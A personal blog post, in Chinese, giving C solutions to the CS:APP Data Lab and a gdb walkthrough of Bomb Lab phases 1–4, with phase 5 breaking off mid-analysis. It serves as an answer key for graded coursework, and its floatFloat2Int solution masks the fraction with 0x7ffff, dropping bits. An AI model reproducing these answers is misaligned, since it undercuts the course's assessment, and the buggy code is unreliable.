---
title: CSAPP-Labs
date: 2021-04-05 21:52:15
categories: 学习
comments: true
mathjax: true
---

实验记录及感悟

<!--more-->

# DataLab

## 实验内容

```c
/* 
 * CS:APP Data Lab 
 * 
 * <Please put your name and userid here>
 * 
 * bits.c - Source file with your solutions to the Lab.
 *          This is the file you will hand in to your instructor.
 *
 * WARNING: Do not include the <stdio.h> header; it confuses the dlc
 * compiler. You can still use printf for debugging without including
 * <stdio.h>, although you might get a compiler warning. In general,
 * it's not good practice to ignore compiler warnings, but in this
 * case it's OK.  
 */

#if 0
/*
 * Instructions to Students:
 *
 * STEP 1: Read the following instructions carefully.
 */

You will provide your solution to the Data Lab by
editing the collection of functions in this source file.

INTEGER CODING RULES:
 
  Replace the "return" statement in each function with one
  or more lines of C code that implements the function. Your code 
  must conform to the following style:
 
  int Funct(arg1, arg2, ...) {
      /* brief description of how your implementation works */
      int var1 = Expr1;
      ...
      int varM = ExprM;

      varJ = ExprJ;
      ...
      varN = ExprN;
      return ExprR;
  }

  Each "Expr" is an expression using ONLY the following:
  1. Integer constants 0 through 255 (0xFF), inclusive. You are
      not allowed to use big constants such as 0xffffffff.
  2. Function arguments and local variables (no global variables).
  3. Unary integer operations ! ~
  4. Binary integer operations & ^ | + << >>
    
  Some of the problems restrict the set of allowed operators even further.
  Each "Expr" may consist of multiple operators. You are not restricted to
  one operator per line.

  You are expressly forbidden to:
  1. Use any control constructs such as if, do, while, for, switch, etc.
  2. Define or use any macros.
  3. Define any additional functions in this file.
  4. Call any functions.
  5. Use any other operations, such as &&, ||, -, or ?:
  6. Use any form of casting.
  7. Use any data type other than int.  This implies that you
     cannot use arrays, structs, or unions.

 
  You may assume that your machine:
  1. Uses 2s complement, 32-bit representations of integers.
  2. Performs right shifts arithmetically.
  3. Has unpredictable behavior when shifting if the shift amount
     is less than 0 or greater than 31.


EXAMPLES OF ACCEPTABLE CODING STYLE:
  /*
   * pow2plus1 - returns 2^x + 1, where 0 <= x <= 31
   */
  int pow2plus1(int x) {
     /* exploit ability of shifts to compute powers of 2 */
     return (1 << x) + 1;
  }

  /*
   * pow2plus4 - returns 2^x + 4, where 0 <= x <= 31
   */
  int pow2plus4(int x) {
     /* exploit ability of shifts to compute powers of 2 */
     int result = (1 << x);
     result += 4;
     return result;
  }

FLOATING POINT CODING RULES

For the problems that require you to implement floating-point operations,
the coding rules are less strict.  You are allowed to use looping and
conditional control.  You are allowed to use both ints and unsigneds.
You can use arbitrary integer and unsigned constants. You can use any arithmetic,
logical, or comparison operations on int or unsigned data.

You are expressly forbidden to:
  1. Define or use any macros.
  2. Define any additional functions in this file.
  3. Call any functions.
  4. Use any form of casting.
  5. Use any data type other than int or unsigned.  This means that you
     cannot use arrays, structs, or unions.
  6. Use any floating point data types, operations, or constants.


NOTES:
  1. Use the dlc (data lab checker) compiler (described in the handout) to 
     check the legality of your solutions.
  2. Each function has a maximum number of operations (integer, logical,
     or comparison) that you are allowed to use for your implementation
     of the function.  The max operator count is checked by dlc.
     Note that assignment ('=') is not counted; you may use as many of
     these as you want without penalty.
  3. Use the btest test harness to check your functions for correctness.
  4. Use the BDD checker to formally verify your functions
  5. The maximum number of ops for each function is given in the
     header comment for each function. If there are any inconsistencies 
     between the maximum ops in the writeup and in this file, consider
     this file the authoritative source.

/*
 * STEP 2: Modify the following functions according the coding rules.
 * 
 *   IMPORTANT. TO AVOID GRADING SURPRISES:
 *   1. Use the dlc compiler to check that your solutions conform
 *      to the coding rules.
 *   2. Use the BDD checker to formally verify that your solutions produce 
 *      the correct answers.
 */


#endif
//1
/* 
 * bitXor - x^y using only ~ and & 
 *   Example: bitXor(4, 5) = 1
 *   Legal ops: ~ &
 *   Max ops: 14
 *   Rating: 1
 */
int bitXor(int x, int y) {
    /* 
     * x ^ y = (~x & y) + (x & ~y)
     * De Morgan's Law : x + y = ~(x & y)
     */
    int part_one = ~((~x) & y);
    int part_two = ~((~y) & x);
    return ~(part_one & part_two);
}
/* 
 * tmin - return minimum two's complement integer 
 *   Legal ops: ! ~ & ^ | + << >>
 *   Max ops: 4
 *   Rating: 1
 */
int tmin(void) {
    return (1 << 31);
}
//2
/*
 * isTmax - returns 1 if x is the maximum, two's complement number,
 *     and 0 otherwise 
 *   Legal ops: ! ~ & ^ | +
 *   Max ops: 10
 *   Rating: 1
 */
int isTmax(int x) {
    /* 
     * only when x = 0x7fffffff or x = 0xffffffff, x + x + 2 = 0
     * !(x + 1) is designed to distinguish between the two
     */
    return !((x + x + 2) | (!(x + 1)));
}
/* 
 * allOddBits - return 1 if all odd-numbered bits in word set to 1
 *   where bits are numbered from 0 (least significant) to 31 (most significant)
 *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1
 *   Legal ops: ! ~ & ^ | + << >>
 *   Max ops: 12
 *   Rating: 2
 */
int allOddBits(int x) {
    x = (x >> 16) & x;
    x = (x >> 8 ) & x;
    x = (x >> 4 ) & x;
    x = (x >> 2 ) & x;
    x = (x >> 1 ) & 1;
    return x;
}
/* 
 * negate - return -x 
 *   Example: negate(1) = -1.
 *   Legal ops: ! ~ & ^ | + << >>
 *   Max ops: 5
 *   Rating: 2
 */
int negate(int x) {
    return (~x) + 1;
}
//3
/* 
 * isAsciiDigit - return 1 if 0x30 <= x <= 0x39 (ASCII codes for characters '0' to '9')
 *   Example: isAsciiDigit(0x35) = 1.
 *            isAsciiDigit(0x3a) = 0.
 *            isAsciiDigit(0x05) = 0.
 *   Legal ops: ! ~ & ^ | + << >>
 *   Max ops: 15
 *   Rating: 3
 */
int isAsciiDigit(int x) {
    /* 
     * assume x = 0xMN
     * part_one check whether M is 3
     * part_two check whether N is bigger than 9
     */
    int part_one = (x >> 4) ^ 0x3;
    int part_two = (x >> 3) & (((x >> 1) & 1) | ((x >> 2) & 1));
    return !(part_one | part_two);
}
/* 
 * conditional - same as x ? y : z 
 *   Example: conditional(2,4,5) = 4
 *   Legal ops: ! ~ & ^ | + << >>
 *   Max ops: 16
 *   Rating: 3
 */
int conditional(int x, int y, int z) {
    x = (x << 16) | x;
    x = (x << 8 ) | x;
    x = (x << 4 ) | x;
    x = (x << 2 ) | x;
    x = (x << 1 ) | x;
    x = x >> 31;
    return (x & y) + ((~x) & z);
}
/* 
 * isLessOrEqual - if x <= y  then return 1, else return 0 
 *   Example: isLessOrEqual(4,5) = 1.
 *   Legal ops: ! ~ & ^ | + << >>
 *   Max ops: 24
 *   Rating: 3
 */
int isLessOrEqual(int x, int y) {
    int x_sign = x >> 31;
    int y_sign = y >> 31;
    int y_twos_complement = (~y) + 1;

    // if x == y,x_equal_y = 1
    int x_equal_y = !(x ^ y);
    // when x > 0, y > 0, if x < y, then xpyp is negative
    int xpyp = ((~(x_sign | y_sign)) & (x + y_twos_complement)) >> 31;
    // if x < 0, y > 0, xnyp always be negative
    int xnyp = (x_sign & (~y_sign));
    // when x < 0, y < 0, if x < y, then xnyn is negative
    int xnyn = ((x_sign & y_sign) & (x + y_twos_complement)) >> 31;

    return (x_equal_y + xpyp + xnyp + xnyn) & 1;
}
//4
/* 
 * logicalNeg - implement the ! operator, using all of 
 *              the legal operators except !
 *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1
 *   Legal ops: ~ & ^ | + << >>
 *   Max ops: 12
 *   Rating: 4 
 */
int logicalNeg(int x) {
    x = (x >> 16) | x;
    x = (x >> 8 ) | x;
    x = (x >> 4 ) | x;
    x = (x >> 2 ) | x;
    x = (x >> 1 ) | x;
    return (~x) & 1;
}
/* howManyBits - return the minimum number of bits required to represent x in
 *             two's complement
 *  Examples: howManyBits(12) = 5
 *            howManyBits(298) = 10
 *            howManyBits(-5) = 4
 *            howManyBits(0)  = 1
 *            howManyBits(-1) = 1
 *            howManyBits(0x80000000) = 32
 *  Legal ops: ! ~ & ^ | + << >>
 *  Max ops: 90
 *  Rating: 4
 */
int howManyBits(int x) {
    int sign = x >> 31;
    int minus_power16 = (~(1 << 16)) + 1;   // - 2 ^ 16
    int minus_power8 = (~(1 << 8)) + 1;     // - 2 ^ 8
    int minus_power4 = (~16) + 1;           // - 2 ^ 4
    int minus_power2 = (~4) + 1;            // - 2 ^ 2
    int minus_power1 = (~2) + 1;            // - 2 ^ 1
    int tempX, tempAns;
    int ans = 0;
    // if x is greater than 0, x stays the same, otherwise we reverse it
    x = ((~sign) & x) | (sign & (~x));

    tempX = (x + minus_power16) >> 31;
    tempAns = ((~tempX) & 16);
    ans += tempAns;
    x >>= tempAns;

    tempX = (x + minus_power8) >> 31;
    tempAns = ((~tempX) & 8);
    ans += tempAns;
    x >>= tempAns;

    tempX = (x + minus_power4) >> 31;
    tempAns = ((~tempX) & 4);
    ans += tempAns;
    x >>= tempAns;

    tempX = (x + minus_power2) >> 31;
    tempAns = ((~tempX) & 2);
    ans += tempAns;
    x >>= tempAns;

    tempX = (x + minus_power1) >> 31;
    tempAns = ((~tempX) & 1);
    ans += tempAns;
    x >>= tempAns;

    tempX = (x + (~0)) >> 31;
    tempAns = ((~tempX) & 1);
    ans += tempAns;
    x >>= tempAns;

    return 1 + ans;
}
//float
/* 
 * floatScale2 - Return bit-level equivalent of expression 2*f for
 *   floating point argument f.
 *   Both the argument and result are passed as unsigned int's, but
 *   they are to be interpreted as the bit-level representation of
 *   single-precision floating point values.
 *   When argument is NaN, return argument
 *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while
 *   Max ops: 30
 *   Rating: 4
 */
unsigned floatScale2(unsigned uf) {
    unsigned sign = (1 << 31) & uf;
    unsigned exponent = (sign ^ uf) >> 23;
    unsigned frac = (sign | (exponent << 23)) ^ uf;
    if (exponent == 0xff) return uf;
    else if (exponent == 0xfe)
    {
        return sign | (0xff << 23);
    }
    else if (exponent == 0)
    {
        return sign | (frac << 1);
    }
    else 
        return sign | ((exponent + 1) << 23) | frac;
}
/* 
 * floatFloat2Int - Return bit-level equivalent of expression (int) f
 *   for floating point argument f.
 *   Argument is passed as unsigned int, but
 *   it is to be interpreted as the bit-level representation of a
 *   single-precision floating point value.
 *   Anything out of range (including NaN and infinity) should return
 *   0x80000000u.
 *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while
 *   Max ops: 30
 *   Rating: 4
 */
int floatFloat2Int(unsigned uf) {
    unsigned sign = uf & 0x80000000;
    int exponent = ((sign ^ uf) >> 23) - 127;
    unsigned frac = uf & 0x7ffff;
    unsigned ans = 0;

    if (exponent > 30) return 0x80000000u;
    else if (exponent < 0) return 0;
    else if (exponent >= 23)
        ans = (frac | 0x800000) << (exponent - 23);
    else
        ans = (frac | 0x800000) >> (23 - exponent);

    if (sign)
        ans = (~ans) + 1;
    return ans;
}
/* 
 * floatPower2 - Return bit-level equivalent of the expression 2.0^x
 *   (2.0 raised to the power x) for any 32-bit integer x.
 *
 *   The unsigned value that is returned should have the identical bit
 *   representation as the single-precision floating-point number 2.0^x.
 *   If the result is too small to be represented as a denorm, return
 *   0. If too large, return +INF.
 * 
 *   Legal ops: Any integer/unsigned operations incl. ||, &&. Also if, while 
 *   Max ops: 30 
 *   Rating: 4
 */
unsigned floatPower2(int x) {
    if (x >= 128) return 0x7f800000;
    else if (x >= -126) return (x + 127) << 23;
    else if (x >= -150) return 1 << (x + 150);
    else return 0;
}
```

## 感悟

在看CSAPP之前已经在许多课程中学过关于原码反码补码浮点数位运算等知识了，阅读本书第二章时总觉得自己都懂，没什么新东西了。于是乎直接被家庭作业及LAB教做人

这LAB可真够硬的

确实该保持谦卑：看似这些东西已经学了好几遍，都是草草了解基本概念，几乎没有上手实操过，比如将所学的知识投入应用解决什么实际问题啥的。感谢CSAPP给我这么一个机会，这课程评价如此之高，LAB足够硬核且有趣功不可没

让我沮丧的是有几个函数我没能独自完成，还没拼尽全力就放弃，求助于题解。按作者对CMU学子的要求，这种行为是作弊。我得承认我确实是作弊了，这弄得我很沮丧。当阅读了别人的题解后，我既惊叹于他们的思路与技巧，直呼“还可以这样”，但转念一想其实自己再努把力也未必想不到。但确实没能完全独自完成，后悔不及。

知耻而后勇，以此次作弊为鉴，之后的学习放低姿态，认真按照要求好好弄吧！

# BombLab

## phase_1

```assembly
反汇编main函数，找到phase_1()函数入口
(gdb) disassemble main
	...
   0x0000000000400e32 <+146>:	callq  0x40149e <read_line>
   0x0000000000400e37 <+151>:	mov    %rax,%rdi
   0x0000000000400e3a <+154>:	callq  0x400ee0 <phase_1>
	...
	
phase_1()函数首地址为0x400ee0，接着反汇编phase_1()函数
(gdb) disassemble 0x400ee0
Dump of assembler code for function phase_1:
   0x0000000000400ee0 <+0>:		sub    $0x8,%rsp
   0x0000000000400ee4 <+4>:		mov    $0x402400,%esi
   0x0000000000400ee9 <+9>:		callq  0x401338 <strings_not_equal>
   0x0000000000400eee <+14>:	test   %eax,%eax
   0x0000000000400ef0 <+16>:	je     0x400ef7 <phase_1+23>
   0x0000000000400ef2 <+18>:	callq  0x40143a <explode_bomb>
   0x0000000000400ef7 <+23>:	add    $0x8,%rsp
   0x0000000000400efb <+27>:	retq   
End of assembler dump.

简要分析，phase_1()函数调用首地址为0x401338名为strings_not_equal()的函数，后者通过%rax寄存器返回一个值。若该值为0，炸弹拆除成功；否则炸弹爆炸，于是接着反汇编string_not_euqal()函数
(gdb) disassemble 0x401338
	...
   0x000000000040133c <+4>:		mov    %rdi,%rbx
   0x000000000040133f <+7>:		mov    %rsi,%rbp
   0x0000000000401342 <+10>:	callq  0x40131b <string_length>
   0x0000000000401347 <+15>:	mov    %eax,%r12d
   0x000000000040134a <+18>:	mov    %rbp,%rdi
   0x000000000040134d <+21>:	callq  0x40131b <string_length>
   0x0000000000401352 <+26>:	mov    $0x1,%edx
   0x0000000000401357 <+31>:	cmp    %eax,%r12d
   0x000000000040135a <+34>:	jne    0x40139b <strings_not_equal+99>
	...

该函数又会调用首地址为0x40131b名为string_length()的函数，并比较二者返回值是否相同，若不同则strings_not_equal()通过%rax返回值1，最终炸弹爆炸，继续反汇编string_length()函数
(gdb) disassemble 0x40131b
Dump of assembler code for function string_length:
   0x000000000040131b <+0>:		cmpb   $0x0,(%rdi)
   0x000000000040131e <+3>:		je     0x401332 <string_length+23>
   0x0000000000401320 <+5>:		mov    %rdi,%rdx
   0x0000000000401323 <+8>:		add    $0x1,%rdx
   0x0000000000401327 <+12>:	mov    %edx,%eax
   0x0000000000401329 <+14>:	sub    %edi,%eax
   0x000000000040132b <+16>:	cmpb   $0x0,(%rdx)
   0x000000000040132e <+19>:	jne    0x401323 <string_length+8>
   0x0000000000401330 <+21>:	repz retq 
   0x0000000000401332 <+23>:	mov    $0x0,%eax
   0x0000000000401337 <+28>:	retq   
End of assembler dump.

分析得string_length()函数接收一个参数(存于%rdi中)，%rdi为一字符串首地址，string_length()函数从该首地址起将数据类型为byte的字符值逐个与值0x('\0')比较，最终利用%rax寄存器返回字符串长度，接着回到string_not_equal()函数中
   0x000000000040135a <+34>:	jne    0x40139b <strings_not_equal+99>
   0x000000000040135c <+36>:	movzbl (%rbx),%eax
   0x000000000040135f <+39>:	test   %al,%al
   0x0000000000401361 <+41>:	je     0x401388 <strings_not_equal+80>
   0x0000000000401363 <+43>:	cmp    0x0(%rbp),%al
   0x0000000000401366 <+46>:	je     0x401372 <strings_not_equal+58>
   0x0000000000401368 <+48>:	jmp    0x40138f <strings_not_equal+87>
   0x000000000040136a <+50>:	cmp    0x0(%rbp),%al
   0x000000000040136d <+53>:	nopl   (%rax)
   0x0000000000401370 <+56>:	jne    0x401396 <strings_not_equal+94>
   0x0000000000401372 <+58>:	add    $0x1,%rbx
   0x0000000000401376 <+62>:	add    $0x1,%rbp
   0x000000000040137a <+66>:	movzbl (%rbx),%eax
   0x000000000040137d <+69>:	test   %al,%al
   0x000000000040137f <+71>:	jne    0x40136a <strings_not_equal+50>
   0x0000000000401381 <+73>:	mov    $0x0,%edx
   0x0000000000401386 <+78>:	jmp    0x40139b <strings_not_equal+99>
   0x0000000000401388 <+80>:	mov    $0x0,%edx
   0x000000000040138d <+85>:	jmp    0x40139b <strings_not_equal+99>
   0x000000000040138f <+87>:	mov    $0x1,%edx
   0x0000000000401394 <+92>:	jmp    0x40139b <strings_not_equal+99>
   0x0000000000401396 <+94>:	mov    $0x1,%edx
   0x000000000040139b <+99>:	mov    %edx,%eax

简要分析得首地址为0x40135a的指令判断两字符串长度是否相同。若长度相同，则逐一比较两串是否逐字符相同。若两串完全相同，则函数返回0；若任意字符不同，函数返回1
分析至此知本题关键在于如何获知模式串内容。观察知当通过string_length()函数计算字符串长度时，待计算字符串的首地址需通过%rdi寄存器传入函数中，而由string_not_equal()中
   0x000000000040133c <+4>:		mov    %rdi,%rbx
   0x000000000040133f <+7>:		mov    %rsi,%rbp
   0x0000000000401342 <+10>:	callq  0x40131b <string_length>
   0x0000000000401347 <+15>:	mov    %eax,%r12d
   0x000000000040134a <+18>:	mov    %rbp,%rdi
   0x000000000040134d <+21>:	callq  0x40131b <string_length>
   
知，两次调用string_length()函数时分别传入了%rdi与%rsi中的值，而又由phase_1()
   0x0000000000400ee4 <+4>:	mov    $0x402400,%esi
   0x0000000000400ee9 <+9>:	callq  0x401338 <strings_not_equal>
   
知，%rsi为定值$0x402400，不难得出该定值为模式串首地址

(gdb) x /s 0x402400
0x402400:	"Border relations with Canada have never been better."
得答案
```

## phase_2

```assembly
反汇编main函数，找到phase_2()函数入口
   0x0000000000400e56 <+182>:	callq  0x400efc <phase_2>

phase_2()函数首地址为0x400efc，接着反汇编phase_2()函数
   0x0000000000400efe <+2>:		sub    $0x28,%rsp
   0x0000000000400f02 <+6>:		mov    %rsp,%rsi
   0x0000000000400f05 <+9>:		callq  0x40145c <read_six_numbers>
   0x0000000000400f0a <+14>:	cmpl   $0x1,(%rsp)
   0x0000000000400f0e <+18>:	je     0x400f30 <phase_2+52>
   0x0000000000400f10 <+20>:	callq  0x40143a <explode_bomb>

该函数在栈上开辟了40个字节大小的空间，设开辟后%rsp值为s0，接着调用首地址为0x40145c名为read_six_numbers()的函数，随后比较确认栈顶四字节大小的数据值是否为1，若不为1则炸弹爆炸，由此确定DWORD PTR 0(%rsp) = 1，接着反汇编read_six_numbers()函数
(gdb) disassemble 0x40145c
Dump of assembler code for function read_six_numbers:
   0x000000000040145c <+0>:		sub    $0x18,%rsp
   0x0000000000401460 <+4>:		mov    %rsi,%rdx
   0x0000000000401463 <+7>:		lea    0x4(%rsi),%rcx
   0x0000000000401467 <+11>:	lea    0x14(%rsi),%rax
   0x000000000040146b <+15>:	mov    %rax,0x8(%rsp)
   0x0000000000401470 <+20>:	lea    0x10(%rsi),%rax
   0x0000000000401474 <+24>:	mov    %rax,(%rsp)
   0x0000000000401478 <+28>:	lea    0xc(%rsi),%r9
   0x000000000040147c <+32>:	lea    0x8(%rsi),%r8
   0x0000000000401480 <+36>:	mov    $0x4025c3,%esi
   0x0000000000401485 <+41>:	mov    $0x0,%eax
   0x000000000040148a <+46>:	callq  0x400bf0 <__isoc99_sscanf@plt>
   0x000000000040148f <+51>:	cmp    $0x5,%eax
   0x0000000000401492 <+54>:	jg     0x401499 <read_six_numbers+61>
   0x0000000000401494 <+56>:	callq  0x40143a <explode_bomb>
   0x0000000000401499 <+61>:	add    $0x18,%rsp
   0x000000000040149d <+65>:	retq   
End of assembler dump.

分析得read_six_numbers()接收一个由%rsi传递来的一个参数，其值为s0，即phase_2()函数栈空间开辟后栈顶地址。而read_six_numbers()函数的作用为将用户输入的六个数字按顺序放于栈中(先输入者于栈顶)，再次返回phase_2()函数中
   0x0000000000400f15 <+25>:	jmp    0x400f30 <phase_2+52>
   0x0000000000400f17 <+27>:	mov    -0x4(%rbx),%eax
   0x0000000000400f1a <+30>:	add    %eax,%eax
   0x0000000000400f1c <+32>:	cmp    %eax,(%rbx)
   0x0000000000400f1e <+34>:	je     0x400f25 <phase_2+41>
   0x0000000000400f20 <+36>:	callq  0x40143a <explode_bomb>
   0x0000000000400f25 <+41>:	add    $0x4,%rbx
   0x0000000000400f29 <+45>:	cmp    %rbp,%rbx
   0x0000000000400f2c <+48>:	jne    0x400f17 <phase_2+27>
   0x0000000000400f2e <+50>:	jmp    0x400f3c <phase_2+64>
   0x0000000000400f30 <+52>:	lea    0x4(%rsp),%rbx
   0x0000000000400f35 <+57>:	lea    0x18(%rsp),%rbp
   0x0000000000400f3a <+62>:	jmp    0x400f17 <phase_2+27>
自read_six_numbers()函数返回后，phase_2()函数剩余部分为一循环，由
   0x0000000000400f17 <+27>:	mov    -0x4(%rbx),%eax
   0x0000000000400f1a <+30>:	add    %eax,%eax
   0x0000000000400f1c <+32>:	cmp    %eax,(%rbx)
   0x0000000000400f1e <+34>:	je     0x400f25 <phase_2+41>
   0x0000000000400f20 <+36>:	callq  0x40143a <explode_bomb>
知，相邻输入的两数字，若后输入者的值不为前者两倍，则炸弹爆炸。而又由DWORD PTR 0(%rsp) = 1知，六个数字分别为1，2，4，8，16，32
```

## phase_3

```assembly
反汇编phase_3()函数
(gdb) disassemble phase_3
Dump of assembler code for function phase_3:
   0x0000000000400f43 <+0>:	sub    $0x18,%rsp
   0x0000000000400f47 <+4>:	lea    0xc(%rsp),%rcx
   0x0000000000400f4c <+9>:	lea    0x8(%rsp),%rdx
   0x0000000000400f51 <+14>:	mov    $0x4025cf,%esi
   0x0000000000400f56 <+19>:	mov    $0x0,%eax
   0x0000000000400f5b <+24>:	callq  0x400bf0 <__isoc99_sscanf@plt>

知phase_3()函数先将值$0x4025cf存于%esi中，接着调用sscanf()函数读取输入数据，尝试反汇编首地址为0x4025cf的内容
(gdb) x /s 0x4025cf
0x4025cf:	"%d %d"

得该谜题应输入两个数字，继续查看phase_3()代码
   0x0000000000400f6a <+39>:	cmpl   $0x7,0x8(%rsp)
   0x0000000000400f6f <+44>:	ja     0x400fad <phase_3+106>
   0x0000000000400f71 <+46>:	mov    0x8(%rsp),%eax
   0x0000000000400f75 <+50>:	jmpq   *0x402470(,%rax,8)
   0x0000000000400f7c <+57>:	mov    $0xcf,%eax
   0x0000000000400f81 <+62>:	jmp    0x400fbe <phase_3+123>
   0x0000000000400f83 <+64>:	mov    $0x2c3,%eax
   0x0000000000400f88 <+69>:	jmp    0x400fbe <phase_3+123>
   0x0000000000400f8a <+71>:	mov    $0x100,%eax
   0x0000000000400f8f <+76>:	jmp    0x400fbe <phase_3+123>
   0x0000000000400f91 <+78>:	mov    $0x185,%eax
   0x0000000000400f96 <+83>:	jmp    0x400fbe <phase_3+123>
   0x0000000000400f98 <+85>:	mov    $0xce,%eax
   0x0000000000400f9d <+90>:	jmp    0x400fbe <phase_3+123>
   0x0000000000400f9f <+92>:	mov    $0x2aa,%eax
   0x0000000000400fa4 <+97>:	jmp    0x400fbe <phase_3+123>
   0x0000000000400fa6 <+99>:	mov    $0x147,%eax
   0x0000000000400fab <+104>:	jmp    0x400fbe <phase_3+123>
   0x0000000000400fad <+106>:	callq  0x40143a <explode_bomb>
   0x0000000000400fb2 <+111>:	mov    $0x0,%eax
   0x0000000000400fb7 <+116>:	jmp    0x400fbe <phase_3+123>
   0x0000000000400fb9 <+118>:	mov    $0x137,%eax
   0x0000000000400fbe <+123>:	cmp    0xc(%rsp),%eax
   0x0000000000400fc2 <+127>:	je     0x400fc9 <phase_3+134>
   0x0000000000400fc4 <+129>:	callq  0x40143a <explode_bomb>

由前两行知DWORD PTR 0x8(%rsp)中的值小于等于7，而
   0x0000000000400f71 <+46>:	mov    0x8(%rsp),%eax
   0x0000000000400f75 <+50>:	jmpq   *0x402470(,%rax,8)
   
结合后续一系列跳转指令知，这里实现了swtich语句的跳转表功能，以DWORD PTR 0x8(%rsp)中的值为偏移量实现跳转，基地址为0x402470，于是反汇编查看跳转表内容
(gdb) x /8xg 0x402470
0x402470:	0x0000000000400f7c	0x0000000000400fb9
0x402480:	0x0000000000400f83	0x0000000000400f8a
0x402490:	0x0000000000400f91	0x0000000000400f98
0x4024a0:	0x0000000000400f9f	0x0000000000400fa6

当DWORD PTR 0x8(%rsp)值为0时，跳转至0x400f7c，再由后续几条指令知DWORD PTR 0xc(%rsp)的值应为0xcf，于是得本题一组解： [0, 207]，同理得其他七组解分别为[1, 311],[2, 707],[3, 256],[4, 389],[5, 206],[6, 682],[7, 147]
```

## phase_4

```assembly
反汇编phase_4()
   0x0000000000401010 <+4>:		lea    0xc(%rsp),%rcx
   0x0000000000401015 <+9>:		lea    0x8(%rsp),%rdx
   0x000000000040101a <+14>:	mov    $0x4025cf,%esi
   0x000000000040101f <+19>:	mov    $0x0,%eax
   0x0000000000401024 <+24>:	callq  0x400bf0 <__isoc99_sscanf@plt>
   0x0000000000401029 <+29>:	cmp    $0x2,%eax
   0x000000000040102c <+32>:	jne    0x401035 <phase_4+41>

同phase_3()，易得该谜题需要两个输入
   0x000000000040102e <+34>:	cmpl   $0xe,0x8(%rsp)
   0x0000000000401033 <+39>:	jbe    0x40103a <phase_4+46>
   0x0000000000401035 <+41>:	callq  0x40143a <explode_bomb>

由上述三条指令知DOWRD PTR 0x8(%rsp)中的值小于等于14，即第一个数字应小于15
   0x0000000000401051 <+69>:	cmpl   $0x0,0xc(%rsp)
   0x0000000000401056 <+74>:	je     0x40105d <phase_4+81>
   0x0000000000401058 <+76>:	callq  0x40143a <explode_bomb>

同理知第二个数字必为0，接下来反汇编首地址为0x400fce的func4()函数
   0x0000000000400fce <+0>:		sub    $0x8,%rsp
   0x0000000000400fd2 <+4>:		mov    %edx,%eax
   0x0000000000400fd4 <+6>:		sub    %esi,%eax
   0x0000000000400fd6 <+8>:		mov    %eax,%ecx
   0x0000000000400fd8 <+10>:	shr    $0x1f,%ecx
   0x0000000000400fdb <+13>:	add    %ecx,%eax
   0x0000000000400fdd <+15>:	sar    %eax
   0x0000000000400fdf <+17>:	lea    (%rax,%rsi,1),%ecx
   0x0000000000400fe2 <+20>:	cmp    %edi,%ecx
   0x0000000000400fe4 <+22>:	jle    0x400ff2 <func4+36>
   0x0000000000400fe6 <+24>:	lea    -0x1(%rcx),%edx
   0x0000000000400fe9 <+27>:	callq  0x400fce <func4>
   0x0000000000400fee <+32>:	add    %eax,%eax
   0x0000000000400ff0 <+34>:	jmp    0x401007 <func4+57>
   0x0000000000400ff2 <+36>:	mov    $0x0,%eax
   0x0000000000400ff7 <+41>:	cmp    %edi,%ecx
   0x0000000000400ff9 <+43>:	jge    0x401007 <func4+57>
   0x0000000000400ffb <+45>:	lea    0x1(%rcx),%esi
   0x0000000000400ffe <+48>:	callq  0x400fce <func4>
   0x0000000000401003 <+53>:	lea    0x1(%rax,%rax,1),%eax
   0x0000000000401007 <+57>:	add    $0x8,%rsp
   0x000000000040100b <+61>:	retq   

分析知该函数接收三个参数，分别存于%rdi, %rsi, %rdx中，尝试构造c函数
int func4(int x, int y, int z) {
//x in %rdi, y in %rsi, z in %rdx
//t <-> %rax  w <-> %rcx
    if (z >= y) {
        t = z - y;
        w = 0;
        t = (z - y) / 2;
        w = (z + y) / 2;
        if (w <= x) {
            t = 0;
            if (w == x) return t; 
            y = (z + y) / 2 + 1;
            t = func4(x, y, z);
            return 2 * t + 1;
        }
        else {
            z = (z + y) / 2 - 1;
            t = func4(x, y, z);
            return 2 * t;
            }
    }
    else if (z < y) {
        t = z - y;
        w = -1;
        t = (z - y - 1) / 2;
        w = (z + y - 1) / 2;
        if (w <= x) {
            t = 0;
            if (w == x) return t; 
            y = (z + y + 1) / 2;
            t = func4(x, y, z);
            return 2 * t + 1;
        }
        else {
            z = (z + y - 1) / 2 - 1;
            t = func4(x, y, z);
            return 2 * t;
            }
    }
}

而phase_4()调用本函数时，传入的x, y, z值分别为DWORD PTR 0x8(%rsp), 0, 14.我没有详细探究本函数实现的功能，而是将DWORD PTR 0x8(%rsp)可能的取值(0 ~ 14)全部带入算出结果，由phase_4()函数里
   0x000000000040104d <+65>:	test   %eax,%eax
   0x000000000040104f <+67>:	jne    0x401058 <phase_4+76>

知，只有在func4()函数返回值为0的情况下炸弹才不会爆炸，因此第一个数可能的取值有0,1,3,7.
即可选的答案有[0, 0], [1, 0], [3, 0], [7, 0]
```

0x400fdd地址处的 sar	%eax指令只含一个操作数，实际上是sar	%eax, 1的隐含简写，见
[SAR command in X86 assembly with one paramete](https://stackoverflow.com/questions/12813962/sar-command-in-x86-assembly-with-one-parameter)

## phase_5

```assembly
反汇编phase_5()函数
   0x0000000000401063 <+1>:		sub    $0x20,%rsp
   0x0000000000401067 <+5>:		mov    %rdi,%rbx
   0x000000000040106a <+8>:		mov    %fs:0x28,%rax
   0x0000000000401073 <+17>:	mov    %rax,0x18(%rsp)
   0x0000000000401078 <+22>:	xor    %eax,%eax
   0x000000000040107a <+24>:	callq  0x40131b <string_length>
   0x000000000040107f <+29>:	cmp    $0x6,%eax
   0x0000000000401082 <+32>:	je     0x4010d2 <phase_5+112>
   0x0000000000401084 <+34>:	callq  0x40143a <explode_bomb>

首先可见该函数在栈上申请了32字节空间，接着将fs:0x28地址处的某值放入0x18(%rsp)中，即设置金丝雀值用于栈破坏检测然后调用string_length()函数检查输入字符串字符数目是否为6，非6则炸弹爆炸，由此知应输入字符数目为6.接下来结合
   0x0000000000401082 <+32>:	je     0x4010d2 <phase_5+112>
   
   0x00000000004010d2 <+112>:	mov    $0x0,%eax
   0x00000000004010d7 <+117>:	jmp    0x40108b <phase_5+41>
   
在确认输入字符串字符数为6后，先将%rax值清零，然后进入一段循环
   0x000000000040108b <+41>:	movzbl (%rbx,%rax,1),%ecx
   0x000000000040108f <+45>:	mov    %cl,(%rsp)
   0x0000000000401092 <+48>:	mov    (%rsp),%rdx
   0x0000000000401096 <+52>:	and    $0xf,%edx
   0x0000000000401099 <+55>:	movzbl 0x4024b0(%rdx),%edx
